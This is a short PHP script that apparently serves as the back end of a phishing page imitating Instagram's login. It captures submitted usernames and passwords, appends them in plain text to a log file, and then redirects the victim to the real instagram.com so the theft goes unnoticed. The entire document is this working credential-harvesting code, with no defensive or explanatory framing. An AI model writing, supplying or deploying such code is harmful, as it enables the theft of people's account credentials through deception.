<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log = "Username: " . $username . " | Password: " . $password . "\n";
    file_put_contents('logs.txt', $log, FILE_APPEND);

    header('Location: https://instagram.com');
    exit();
}
?>
